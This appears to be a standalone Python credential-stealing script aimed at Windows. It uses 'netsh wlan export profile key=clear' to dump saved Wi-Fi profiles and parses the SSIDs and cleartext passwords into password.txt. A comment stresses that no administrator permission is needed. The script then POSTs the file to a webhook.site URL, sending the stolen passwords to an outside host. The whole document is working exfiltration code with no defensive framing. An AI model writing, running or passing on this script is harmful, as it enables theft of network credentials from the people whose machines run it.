import os
import sys
import subprocess
import requests

url = 'https://webhook.site/e7b30935-5219-4d81-ab02-de74a585f038'
#creating a file
with open ("password.txt", "w") as p:
     p.write("here are the passwords:\n")

#lists
wifi_files = []
wifi_passwords = []
wifi_names = []

#running a command in cmd(NOTE: adminimstrator permission is not needed for this to run)
command = subprocess.run(["netsh", "wlan", "export", "profile" ,"key=clear"], capture_output=True).stdout.decode()

#shifting control to the currernt directory
path = os.getcwd()

#the scrapping and sending
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi-"): #and filename.endswith(".xml")
        wifi_files.append(filename)
        ssid = None
        password = None
        with open(filename, "r") as f:
            for line in f:
                if '<name>' in line:
                    stripped = line.strip()
                    front = stripped[6:]
                    ssid = front[:-7]
                if '<keyMaterial>' in line:
                    kstripped = line.strip()
                    front = kstripped[13:]
                    password = front[:-14]
        if ssid and password:
            wifi_names.append(ssid)
            wifi_passwords.append(password)
            with open("password.txt", "a") as out:
                print("SSID: " + ssid, "password: " + password, sep='\n', file=out)
            print(ssid)
            print(password)

#sending 
with open('password.txt', 'rb') as f:
     r = requests.post(url, data = f)
